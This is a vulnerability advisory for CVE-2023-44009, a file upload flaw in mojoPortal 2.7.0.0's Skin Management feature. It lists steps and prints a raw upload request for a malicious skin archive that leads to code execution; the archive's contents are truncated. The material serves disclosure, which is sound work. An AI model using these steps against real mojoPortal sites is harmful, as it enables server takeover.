# CVE-2023-44009
## Basic Information
- Date: 29/09/2023
- Affected Version: mojoPortal 2.7.0.0
- Vendor Homepage: https://www.mojoportal.com/
- Exploit Author: Hoang of VietSunshine Cyber Security Services

## Description
File Upload vulnerability in mojoPortal v.2.7.0.0 allows a remote attacker to execute arbitrary code via the Skin Management function.
## Attack Vectors
- Access **Design Tools** -> **Skin Management** and upload a compressed skin which contains malicious code at `layout.master`file

![1.png](screenshots/1.png)

RAW REQUEST
```
POST /Services/FileService.ashx?cmd=uploadskin&t=5e0a58ed-030b-4a19-851c-63d642d7af26 HTTP/1.1
Host: mojoportal.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------191852139216153289813052071419
Content-Length: 355858
Origin: http://mojoportal.local
Connection: close
Referer: http://mojoportal.local/DesignTools/SkinList.aspx
Cookie: ASP.NET_SessionId=dpcykcep22dzv32q5c4vsrif; .mojochangeme=CA65F98FE9995302641B71E9C3E5F22647610049F514B95B5FD7FB819A1319C35B42795413D058975864C8AB2FAD392A7DFABCA19F8726349B1DA72327A3B3005C055BB57B15F0E78E9C425BBDD6074B7556940046FA911CB67F1DAAFEEB7214CE2214F2; mojoportal.localportalroles1=8CD58612783F88B68C1FF3DC060D5E9DA69DFD0BF4DE48B809C66748ACB208D1567E8AF0D3B6CA219936A0F5A42668113E012204CF0BAFF9AE11FD0E69B7D172BEF08DAC804DF3A88651B01F6B0A8BA8F1E9D8EEC897726DBF2309DB15C82B1FFBAAC9C090AC4F3D482F483FCDA2FF5CE6BB63DA0ED84873399CA896C3E357AE39BC22E74BF033A4AD1FA97069EFC2D7421F2473; fwAdminDrawer=close

-----------------------------191852139216153289813052071419
Content-Disposition: form-data; name="frmData"

on
-----------------------------191852139216153289813052071419
Content-Disposition: form-data; name="ctl00$mainContent$uploader"; filename="framework1.zip"
Content-Type: application/zip
[...TRUNCATED...]
```
- Access `http://[site]/?skin=[skin_name]` to execute malicious code

![2.png](screenshots/2.png)
